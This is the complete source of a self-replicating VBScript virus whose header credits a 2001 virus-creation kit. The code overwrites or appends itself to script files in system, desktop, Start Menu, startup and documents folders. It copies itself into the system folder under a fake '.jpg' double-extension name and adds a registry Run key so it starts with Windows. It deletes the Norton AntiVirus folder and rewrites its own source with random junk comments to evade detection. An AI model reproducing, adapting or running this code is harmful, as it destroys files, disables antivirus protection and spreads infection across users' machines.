REM Created by -DaVidos- using WINDOWS SCRIPTING HOST VIRUS CREATOR 2001
On Error Resume Next
Set F = CreateObject("Scripting.FileSystemObject")
Set W = CreateObject("Wscript.Shell")
Set OpenSelf = F.OpenTextFile(Wscript.ScriptFullName, 1)
Self = OpenSelf.Readall
Set Wfolder = F.GetSpecialFolder(0)
For each F1 in Wfolder.Files
 ExtName = F.GetExtensionName(F1.path)
 If (ExtName="vbs") or (ExtName="vbe") then
   Set OF = F.OpenTextFile(F1.path, 2, True)
   OF.WriteLine Self
   OF.Close
 End If
Next
Folder1 = W.SpecialFolders("AllUsersDesktop")
For Each Files1 in Folder1
 ExtName1 = F.GetExtensionName(Files1.path)
 If (ExtName1 = "vbs") or (ExtName1 = "vbe") then
   Set OF1 = F.OpenTextFile(Files1.path, 2, True)
   OF1.WriteLine Self
   OF1.Close
 End If
Next
Folder2 = W.SpecialFolders("AllUsersStartMenu")
For Each Files2 in Folder2
 ExtName2 = F.GetExtensionName(Files2.path)
 If (ExtName2 = "vbs") or (ExtName2 = "vbe") then
   Set OF2 = F.OpenTextFile(Files2.path, 2, True)
   OF2.WriteLine Self
   OF2.Close
 End If
Next
Folder3 = W.SpecialFolders("AllUsersPrograms")
For Each Files3 in Folder3
 ExtName3 = F.GetExtensionName(Files3.path)
 If (ExtName3 = "vbs") or (ExtName3 = "vbe") then
   Set OF3 = F.OpenTextFile(Files2.path, 3, True)
   OF3.WriteLine Self
   OF3.Close
 End If
Next
Folder4 = W.SpecialFolders("AllUsersStartup")
For Each Files4 in Folder4
 ExtName4 = F.GetExtensionName(Files4.path)
 If (ExtName4 = "vbs") or (ExtName4 = "vbe") then
   Set OF4 = F.OpenTextFile(Files4.path, 3, True)
   OF4.WriteLine Self
   OF4.Close
 End If
Next
Folder5 = W.SpecialFolders("MyDocuments")
For Each Files5 in Folder5
 ExtName5 = F.GetExtensionName(Files5.path)
 If (ExtName5 = "vbs") or (ExtName5 = "vbe") then
   Set OF5 = F.OpenTextFile(Files5.path, 3, True)
   OF5.WriteLine Self
   OF5.Close
 End If
Next
Set Sysfolder = F.GetSpecialFolder(1)
F.CopyFile Wscript.ScriptFullName, Sysfolder & "\bzyk.vbs.jpg.vbs"
W.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Startup", Sysfolder & "\bzyk.vbs.jpg.vbs"
If F.FolderExists("C:\Program files\Norton AntiVirus") then
  F.FolderDelete("C:\Program files\Norton AntiVirus")
End If
On Error Resume Next
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(WScript.ScriptFullName, 1)
AllCode = f.Readall
FOR o = 1 TO LEN(AllCode)
IF Mid(AllCode, o, 1) = vbCr THEN x = x + 1
NEXT
Set f = fso.OpenTextFile(WScript.ScriptFullName, 1)
FOR i = 1 TO (x + 1)
LineCode = f.Readline
For j = 1 To Int(Rnd * 30): JunkCode = JunkCode & Chr(255 - Int(Rnd * 200)): Next
PolyCode = PolyCode & LineCode & Chr(39) & JunkCode & vbCr
If Int(Rnd * 3) = 2 Then PolyCode = PolyCode & Chr(39) & JunkCode & vbCr
JunkCode = ""
IF LineCode = "" THEN EXIT FOR
LineCode = ""
NEXT
Set f = fso.OpenTextFile(WScript.ScriptFullName, 2, True)
f.Writeline PolyCode
